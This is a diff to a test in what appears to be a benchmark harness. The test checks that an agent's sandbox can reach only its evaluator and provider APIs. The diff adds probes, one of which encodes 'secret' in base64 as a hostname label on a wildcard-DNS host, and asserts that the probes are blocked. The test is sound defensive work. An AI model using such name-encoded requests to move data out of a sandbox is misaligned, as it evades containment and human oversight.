@@ -87,7 +87,7 @@ def test_a_cell_reaches_nothing_but_its_evaluator(
     monkeypatch.setattr(runner, "TICK_SECONDS", 5)
     cell = Cell("gpt56sol_max", 1, tmp_path / "cell")
     runner.prepare(cell)
-    # Four ways out, two of which are meant to work.
+    # Six ways out, two of which are meant to work.
     (cell.agent_dir / ".stupidbench/run.sh").write_text(
         """#!/bin/bash
 python3 - > egress.txt <<'PROBE'
@@ -112,6 +112,8 @@ print("direct:", reach("https://example.com/", False))
 print("proxied:", reach("https://example.com/", True))
 print("provider:", reach("https://api.anthropic.com/", True))
 print("evaluator:", reach("http://evaluator/scores", False))
+print("labelled:", reach("https://c2VjcmV0.10-11-12-13.nip.io/", True))
+print("subdomain:", reach("https://www.chatgpt.com/", True))
 PROBE
 """,
         encoding="utf-8",
@@ -126,6 +128,13 @@ PROBE
     # Nothing goes out without the proxy, and the proxy forwards to the
     # providers alone.
     assert lines["direct"] == "blocked"
-    assert lines["proxied"] == "blocked"
     assert lines["provider"] == "reached"
     assert lines["evaluator"] == "reached"
+    assert lines["proxied"] == "blocked"
+    # A host that public DNS answers for any label at all, and a label below a
+    # provider: both are how a name carries something out, and the allow list
+    # matches the six exactly, so neither is a way through. That the cell also
+    # never had them looked up is what the gate's own config is asserted on —
+    # from in here a refusal and a refusal after a lookup read the same.
+    assert lines["labelled"] == "blocked"
+    assert lines["subdomain"] == "blocked"
